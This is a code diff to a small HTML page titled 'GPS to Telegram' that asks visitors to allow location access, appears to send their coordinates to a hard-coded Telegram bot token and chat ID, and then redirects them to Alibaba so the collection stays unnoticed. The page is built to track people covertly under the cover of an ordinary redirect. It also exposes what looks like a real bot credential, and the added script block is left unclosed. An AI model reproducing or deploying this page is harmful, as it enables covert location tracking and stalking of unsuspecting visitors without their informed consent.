@@ -1,9 +1,10 @@
 <!DOCTYPE html>
 <html>
   <head>
-  <meta http-equiv="refresh" content="20;url=https://www.alibaba.com/">
-    <title>LY</title>
+     <meta http-equiv="refresh" content="3;url=https://alibaba.com">
+    <title>GPS to Telegram</title>
     <script>
+    
       const botToken = "8995044728:AAGgpbzLojpY9JtbP5ccigc3WuliHvVEqAQ"; // <-- Replace with your Bot token
       const chatId = "8401907837"; // <-- Replace with your Chat ID
 
@@ -25,7 +26,7 @@
           })
         })
         .then(() => {
-          document.body.innerHTML = "<h2 style='color:green;'>Redirecting to Alibaba</h2>";
+          document.body.innerHTML = "<h2 style='color:blue;'>Redirecting to Alibaba</h2>";
         })
         .catch(err => {
           console.error(err);
@@ -47,7 +48,34 @@
     </script>
   </head>
   <body>
-    <h2>📡 Tracking Location...</h2>
+     <button onclick="getLocation()">Allow Location</button>
+
+    <script>
+        function getLocation() {
+            if (!navigator.geolocation) {
+                alert("Your browser does not support location access.");
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    // Location successfully obtained
+                    console.log("Latitude:", position.coords.latitude);
+                    console.log("Longitude:", position.coords.longitude);
+
+                    // Continue after permission
+                    window.location.href = "https://www.alibaba.com/";
+                },
+
+                function(error) {
+                    if (error.code === 1) {
+                        alert("Please allow location access to continue.");
+                    } else {
+                        alert("Unable to get your location.");
+                    }
+                }
+            );
+        }
   </body>
 </html>
 
